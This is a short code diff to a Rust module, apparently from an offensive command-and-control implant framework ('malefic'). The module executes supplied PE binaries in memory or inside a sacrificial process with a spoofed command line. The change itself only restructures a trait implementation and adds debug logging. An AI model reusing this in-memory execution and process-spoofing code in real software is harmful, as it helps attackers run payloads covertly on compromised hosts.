@@ -7,6 +7,7 @@ use malefic_helper::win::kit::pe::{inlinepe::inline_pe, runpe::run_pe};
 use crate::{check_request, Module, Result, TaskResult};
 use malefic_trait::module_impl;
 use malefic_helper::common::utils::format_cmdline;
+use malefic_helper::debug;
 use malefic_proto::proto::modulepb::BinaryResponse;
 use crate::execute::Arch;
 
@@ -14,7 +15,10 @@ pub struct ExecuteExe {}
 
 #[async_trait]
 #[module_impl("execute_exe")]
-impl Module for ExecuteExe {
+impl Module for ExecuteExe {}
+
+#[async_trait]
+impl crate::ModuleImpl for ExecuteExe {
     #[allow(unused_variables)]
     async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
@@ -26,6 +30,7 @@ impl Module for ExecuteExe {
 
         if let Some(sacrifice) = request.sacrifice {
             let cmdline = format_cmdline(request.process_name, request.args);
+            debug!("{}", cmdline);
             let argue = sacrifice.argue;
             let (start_commandline, hijack_commandline) = if argue.is_empty() {
                 (cmdline, String::new())
@@ -50,6 +55,7 @@ impl Module for ExecuteExe {
             } else {
                 format_cmdline(request.process_name, request.args)
             };
+            debug!("{}", par);
             unsafe {
                 result = inline_pe(
                     request.bin.as_ptr() as _,
@@ -73,6 +79,7 @@ impl Module for ExecuteExe {
             message: Vec::new(),
             data: result,
             err: "".to_string(),
-        })))
+        }))
+        )
     }
 }
